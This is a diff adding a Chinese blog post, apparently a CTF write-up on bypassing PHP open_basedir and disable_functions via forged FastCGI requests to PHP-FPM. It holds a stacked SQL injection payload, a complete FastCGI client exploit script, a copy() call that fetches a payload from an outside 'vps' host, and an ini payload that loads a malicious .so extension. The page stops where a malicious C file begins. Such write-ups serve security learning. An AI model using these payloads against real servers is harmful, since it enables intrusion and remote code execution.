@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            从一道CTF学习Fastcgi绕过姿势
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Finance behind Passion in Security
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/friends/" class="menu-item-link">
+                        Friends
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/"> 
+                    从一道CTF学习Fastcgi绕过姿势 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-09-17   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#从一道CTF学习Fastcgi绕过姿势"><span class="toc-list-text">从一道CTF学习Fastcgi绕过姿势</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#前情提要"><span class="toc-list-text">前情提要</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#什么是FastCGI和FPM"><span class="toc-list-text">什么是FastCGI和FPM</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#CGI-amp-FastCGI"><span class="toc-list-text">CGI&amp;FastCGI</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#PHP-FPM"><span class="toc-list-text">PHP-FPM</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#open-basedir的绕过"><span class="toc-list-text">open_basedir的绕过</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#FastCGI脚本"><span class="toc-list-text">FastCGI脚本</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#题目复现"><span class="toc-list-text">题目复现</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Disable-functions的绕过"><span class="toc-list-text">Disable_functions的绕过</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#FastCGI加载so"><span class="toc-list-text">FastCGI加载so</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#LD-PRELOAD加载so"><span class="toc-list-text">LD_PRELOAD加载so</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#总结"><span class="toc-list-text">总结</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p>
+<p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p>
+<p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p>
+<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p>
+<p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p>
+<p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p>
+<p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p>
+<p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p>
+<p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p>
+<p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p>
+<pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 
+
+0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227
+=&gt;
+UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p>
+<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p>
+<h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
+<p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
+<p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p>
+<p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
+<p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
+<p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
+<p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p>
+<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p>
+<h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p>
+<p>在PHP中：</p>
+<ul>
+<li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p>
+</li>
+<li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p>
+</li>
+</ul>
+<h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?php
+class TimedOutException extends \Exception {
+}
+class ForbiddenException extends \Exception {
+}
+class Client {
+const VERSION_1 = 1;
+const BEGIN_REQUEST = 1;
+const ABORT_REQUEST = 2;
+const END_REQUEST = 3;
+const PARAMS = 4;
+const STDIN = 5;
+const STDOUT = 6;
+const STDERR = 7;
+const DATA = 8;
+const GET_VALUES = 9;
+const GET_VALUES_RESULT = 10;
+const UNKNOWN_TYPE = 11;
+const MAXTYPE = self::UNKNOWN_TYPE;
+const RESPONDER = 1;
+const AUTHORIZER = 2;
+const FILTER = 3;
+const REQUEST_COMPLETE = 0;
+const CANT_MPX_CONN = 1;
+const OVERLOADED = 2;
+const UNKNOWN_ROLE = 3;
+const MAX_CONNS = &#39;MAX_CONNS&#39;;
+const MAX_REQS = &#39;MAX_REQS&#39;;
+const MPXS_CONNS = &#39;MPXS_CONNS&#39;;
+const HEADER_LEN = 8;
+const REQ_STATE_WRITTEN = 1;
+const REQ_STATE_OK = 2;
+const REQ_STATE_ERR = 3;
+const REQ_STATE_TIMED_OUT = 4;
+private $_sock = null;
+private $_host = null;
+private $_port = null;
+private $_keepAlive = false;
+private $_requests = array();
+private $_persistentSocket = false;
+private $_connectTimeout = 5000;
+private $_readWriteTimeout = 5000;
+public function __construct( $host, $port ) {
+    $this-&gt;_host = $host;
+    $this-&gt;_port = $port;
+}
+public function setKeepAlive( $b ) {
+          $this-&gt;_keepAlive = (boolean) $b;
+          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {
+              fclose( $this-&gt;_sock );
+    }
+}
+public function getKeepAlive() {
+    return $this-&gt;_keepAlive;
+}
+public function setPersistentSocket( $b ) {
+          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );
+          $this-&gt;_persistentSocket = (boolean) $b;
+          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {
+              fclose( $this-&gt;_sock );
+    }
+}
+public function getPersistentSocket() {
+    return $this-&gt;_persistentSocket;
+}
+public function setConnectTimeout( $timeoutMs ) {
+          $this-&gt;_connectTimeout = $timeoutMs;
+}
+public function getConnectTimeout() {
+    return $this-&gt;_connectTimeout;
+}
+public function setReadWriteTimeout( $timeoutMs ) {
+          $this-&gt;_readWriteTimeout = $timeoutMs;
+          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+}
+public function getReadWriteTimeout() {
+    return $this-&gt;_readWriteTimeout;
+}
+private function set_ms_timeout( $timeoutMs ) {
+          if ( ! $this-&gt;_sock ) {
+        return false;
+    }
+    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );
+}
+private function connect() {
+    if ( ! $this-&gt;_sock ) {
+              if ( $this-&gt;_persistentSocket ) {
+                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
+              } else {
+                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
+              }
+              if ( ! $this-&gt;_sock ) {
+                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );
+              }
+              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {
+            throw new \Exception( &#39;Unable to set timeout on socket&#39; );
+        }
+    }
+}
+private function buildPacket( $type, $content, $requestId = 1 ) {
+          $clen = strlen( $content );
+    return chr( self::VERSION_1 )         /* version */
+           . chr( $type )                    /* type */
+                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */
+           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */
+                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */
+           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */
+                 . chr( 0 )                        /* paddingLength */
+                 . chr( 0 )                        /* reserved */
+                 . $content;                     /* content */
+}
+private function buildNvpair( $name, $value ) {
+    $nlen = strlen( $name );
+    $vlen = strlen( $value );
+    if ( $nlen &lt; 128 ) {
+              /* nameLengthB0 */
+              $nvpair = chr( $nlen );
+          } else {
+              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );
+          }
+          if ( $vlen &lt; 128 ) {
+        /* valueLengthB0 */
+        $nvpair .= chr( $vlen );
+    } else {
+        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );
+    }
+    /* nameData &amp; valueData */
+    return $nvpair . $name . $value;
+}
+private function readNvpair( $data, $length = null ) {
+    $array = array();
+          if ( $length === null ) {
+        $length = strlen( $data );
+    }
+    $p = 0;
+          while ( $p != $length ) {
+              $nlen = ord( $data{$p ++} );
+              if ( $nlen &gt;= 128 ) {
+                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
+                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
+                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
+                  $nlen |= ( ord( $data{$p ++} ) );
+              }
+              $vlen = ord( $data{$p ++} );
+              if ( $vlen &gt;= 128 ) {
+                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
+                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
+                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
+                  $vlen |= ( ord( $data{$p ++} ) );
+              }
+              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );
+              $p                                   += ( $nlen + $vlen );
+    }
+    return $array;
+}
+private function decodePacketHeader( $data ) {
+          $ret                  = array();
+          $ret[&#39;version&#39;]       = ord( $data{0} );
+          $ret[&#39;type&#39;]          = ord( $data{1} );
+          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );
+          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );
+          $ret[&#39;paddingLength&#39;] = ord( $data{6} );
+          $ret[&#39;reserved&#39;]      = ord( $data{7} );
+    return $ret;
+}
+private function readPacket() {
+    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {
+        $resp            = $this-&gt;decodePacketHeader( $packet );
+              $resp[&#39;content&#39;] = &#39;&#39;;
+        if ( $resp[&#39;contentLength&#39;] ) {
+                  $len = $resp[&#39;contentLength&#39;];
+                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {
+                      $len             -= strlen( $buf );
+                      $resp[&#39;content&#39;] .= $buf;
+                  }
+              }
+              if ( $resp[&#39;paddingLength&#39;] ) {
+            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );
+        }
+        return $resp;
+    } else {
+        return false;
+    }
+}
+public function getValues( array $requestedInfo ) {
+          $this-&gt;connect();
+          $request = &#39;&#39;;
+          foreach ( $requestedInfo as $info ) {
+              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );
+          }
+          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );
+          $resp = $this-&gt;readPacket();
+          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {
+              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );
+    } else {
+        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );
+    }
+}
+public function request( array $params, $stdin ) {
+    $id = $this-&gt;async_request( $params, $stdin );
+    return $this-&gt;wait_for_response( $id );
+}
+public function async_request( array $params, $stdin ) {
+    $this-&gt;connect();
+          // Pick random number between 1 and max 16 bit unsigned int 65535
+          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );
+    // Using persistent sockets implies you want them keept alive by server!
+    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );
+          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST
+              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )
+        , $id
+          );
+          $paramsRequest = &#39;&#39;;
+    foreach ( $params as $key =&gt; $value ) {
+              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );
+          }
+          if ( $paramsRequest ) {
+        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );
+    }
+    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );
+          if ( $stdin ) {
+        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );
+    }
+    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );
+          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {
+        $info = stream_get_meta_data( $this-&gt;_sock );
+        if ( $info[&#39;timed_out&#39;] ) {
+                  throw new TimedOutException( &#39;Write timed out&#39; );
+              }
+              // Broken pipe, tear down so future requests might succeed
+              fclose( $this-&gt;_sock );
+        throw new \Exception( &#39;Failed to write request to socket&#39; );
+    }
+    $this-&gt;_requests[ $id ] = array(
+        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,
+        &#39;response&#39; =&gt; null
+    );
+    return $id;
+}
+public function wait_for_response( $requestId, $timeoutMs = 0 ) {
+    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {
+        throw new \Exception( &#39;Invalid request id given&#39; );
+    }
+    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK
+         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR
+    ) {
+        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
+    }
+    if ( $timeoutMs &gt; 0 ) {
+              // Reset timeout on socket for now
+              $this-&gt;set_ms_timeout( $timeoutMs );
+          } else {
+              $timeoutMs = $this-&gt;_readWriteTimeout;
+    }
+    $startTime = microtime( true );
+          do {
+              $resp = $this-&gt;readPacket();
+              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {
+                  if ( $resp[&#39;type&#39;] == self::STDERR ) {
+                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;
+                  }
+                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];
+              }
+              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {
+                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;
+                  if ( $resp[&#39;requestId&#39;] == $requestId ) {
+                      break;
+                  }
+              }
+              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {
+                  // Reset
+                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+                  throw new \Exception( &#39;Timed out&#39; );
+              }
+          } while ( $resp );
+    if ( ! is_array( $resp ) ) {
+              $info = stream_get_meta_data( $this-&gt;_sock );
+              // We must reset timeout but it must be AFTER we get info
+              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+              if ( $info[&#39;timed_out&#39;] ) {
+                  throw new TimedOutException( &#39;Read timed out&#39; );
+              }
+              if ( $info[&#39;unread_bytes&#39;] == 0
+                   &amp;&amp; $info[&#39;blocked&#39;]
+                   &amp;&amp; $info[&#39;eof&#39;] ) {
+                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );
+              }
+              throw new \Exception( &#39;Read failed&#39; );
+          }
+          // Reset timeout
+          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {
+        case self::CANT_MPX_CONN:
+            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );
+            break;
+        case self::OVERLOADED:
+            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );
+            break;
+        case self::UNKNOWN_ROLE:
+            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );
+            break;
+        case self::REQUEST_COMPLETE:
+            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
+    }
+}
+}
+$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);
+  $php_value = &quot;open_basedir = /&quot;;
+$filepath  = &#39;/tmp/readflag.php&#39;;
+  $content   = &#39;hpdoger&#39;;
+echo $client-&gt;request(
+      array(
+          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
+          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
+          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
+    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,
+    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,
+    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
+    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,
+    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
+    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,
+    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),
+          &#39;PHP_VALUE&#39;         =&gt; $php_value,
+),
+$content
+);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
+<p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p>
+<pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）
+
+*lo2.txt*=&gt;
+&lt;?php
+$file_list = array();
+// normal files
+$it = new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+// special files (starting with a dot(.))
+$it = new DirectoryIterator(&quot;glob:///.*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+sort($file_list);
+foreach($file_list as $f){
+        echo &quot;{$f}&lt;br/&gt;&quot;;
+}
+?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p>
+<p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p>
+<p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p>
+<p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p>
+<pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p>
+<pre><code>&lt;?php
+var_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p>
+<h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p>
+<p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p>
+<p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p>
+<p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p>
+<pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
